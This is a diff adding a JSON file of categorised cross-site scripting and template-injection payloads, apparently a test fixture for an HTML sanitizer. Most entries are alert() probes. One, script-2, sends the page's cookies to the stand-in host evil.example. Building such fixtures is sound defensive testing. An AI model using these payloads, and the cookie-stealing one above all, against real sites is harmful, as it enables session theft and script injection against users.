@@ -1,0 +1,29 @@
+[
+  { "id": "script-1",  "category": "script-tag",      "payload": "<script>window.__xssFired=true</script>" },
+  { "id": "script-2",  "category": "script-tag",      "payload": "<script>fetch('https://evil.example/'+document.cookie)</script>" },
+  { "id": "script-3",  "category": "script-tag",      "payload": "<!--<script>alert(1)</script>-->" },
+  { "id": "script-4",  "category": "script-tag",      "payload": "<ScRiPt>window.__xssFired=true</ScRiPt>" },
+
+  { "id": "evh-1",     "category": "event-handler",   "payload": "<img src=x onerror=alert('xss')>" },
+  { "id": "evh-2",     "category": "event-handler",   "payload": "<svg/onload=alert('xss')>" },
+  { "id": "evh-3",     "category": "event-handler",   "payload": "<body onload=alert('xss')>" },
+  { "id": "evh-4",     "category": "event-handler",   "payload": "<details open ontoggle=alert('xss')>" },
+  { "id": "evh-5",     "category": "event-handler",   "payload": "<input autofocus onfocus=alert('xss')>" },
+  { "id": "evh-6",     "category": "event-handler",   "payload": "<a href=\"x\" onclick=\"alert(1)\">link</a>" },
+
+  { "id": "jsurl-1",   "category": "javascript-url",  "payload": "<a href=\"javascript:alert('xss')\">click</a>" },
+  { "id": "jsurl-2",   "category": "javascript-url",  "payload": "<iframe src=\"javascript:alert('xss')\"></iframe>" },
+
+  { "id": "svg-1",     "category": "svg-img-onerror", "payload": "<img src=x onerror=alert(String.fromCharCode(88))>" },
+  { "id": "svg-2",     "category": "svg-img-onerror", "payload": "<svg><script>alert('xss')</script></svg>" },
+
+  { "id": "md-1",      "category": "markdown-link",   "payload": "[click me](javascript:alert('xss'))" },
+  { "id": "md-2",      "category": "markdown-link",   "payload": "[x](data:text/html,<script>alert(1)</script>)" },
+
+  { "id": "ent-1",     "category": "html-entity",     "payload": "&lt;script&gt;alert(1)&lt;/script&gt;" },
+  { "id": "ent-2",     "category": "html-entity",     "payload": "&amp;lt;script&amp;gt;" },
+
+  { "id": "mix-1",     "category": "template-mixed",  "payload": "\"><script>alert('xss')</script>" },
+  { "id": "mix-2",     "category": "template-mixed",  "payload": "{{7*7}}" },
+  { "id": "mix-3",     "category": "template-mixed",  "payload": "<math><malignmark></math><script>alert('xss')</script>" }
+]
